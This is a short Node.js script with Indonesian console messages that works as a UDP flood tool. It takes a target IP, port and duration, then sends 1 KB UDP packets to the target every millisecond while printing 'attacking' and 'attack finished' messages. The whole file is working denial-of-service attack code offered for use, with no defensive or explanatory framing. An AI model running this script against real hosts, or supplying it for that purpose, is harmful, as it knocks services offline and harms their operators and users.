const dgram = require("dgram");
const process = require("process");

if (process.argv.length < 5) {
    console.log(`Usage: node ${process.argv[1]} <IP> <PORT> <TIME>`);
    process.exit(1);
}

const targetIP = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]); // dalam detik

const client = dgram.createSocket("udp4");
const message = Buffer.alloc(1024, "A"); // Buffer 1KB

console.log(`🚀 Menyerang ${targetIP}:${targetPort} selama ${duration} detik...`);

const endTime = Date.now() + duration * 1000;

function sendFlood() {
    if (Date.now() > endTime) {
        console.log("🔥 Serangan selesai!");
        client.close();
        process.exit();
    } else {
        client.send(message, targetPort, targetIP, (err) => {
            if (err) console.error("❌ Error:", err);
        });
    }
}

setInterval(sendFlood, 1);
